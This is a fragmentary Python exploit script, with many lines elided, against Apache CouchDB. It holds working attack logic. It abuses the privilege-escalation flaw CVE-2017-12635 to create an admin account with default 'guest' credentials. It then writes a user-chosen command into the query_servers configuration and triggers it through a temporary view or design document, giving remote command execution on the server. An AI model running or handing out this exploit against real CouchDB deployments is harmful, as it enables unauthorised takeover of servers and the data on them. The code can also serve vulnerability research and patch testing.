    ...
    with requests.session() as session:
        ...
        if args.priv:
            try:
                ...
                pr = session.put(
                    args.host + "/_users/org.couchdb.user:" + args.user, data=payload
                )
        ...
        try:
            if version == 1:
                session.put(
                    args.host + "/_config/query_servers/cmd", data='"' + args.cmd + '"'
                )
                print(
                    "[+] Created payload at: "
                    + args.host
                ...
                session.put(
                    args.host + "/_node/" + host + "/_config/query_servers/cmd",
                    data='"' + args.cmd + '"',
                )
                print(
                    "[+] Created payload at: "
        ...
        try:
            if version == 1:
                session.post(
                    args.host + "/god/_temp_view?limit=10",
                    data='{"language": "cmd", "map": ""}',
                )
            else:
                session.post(
                    args.host + "/god/_design/zero",
...
if __name__ == "__main__":
    ...
    ap.add_argument(
        "--priv",
        help="Exploit privilege escalation (CVE-2017-12635).",
        action="store_true",
    )
    ap.add_argument(
        "-u", "--user", help="Admin username (Default: guest).", default="guest"
    )
    ap.add_argument(
        "-p", "--password", help="Admin password (Default: guest).", default="guest"
    )
    args = ap.parse_args()
    main()
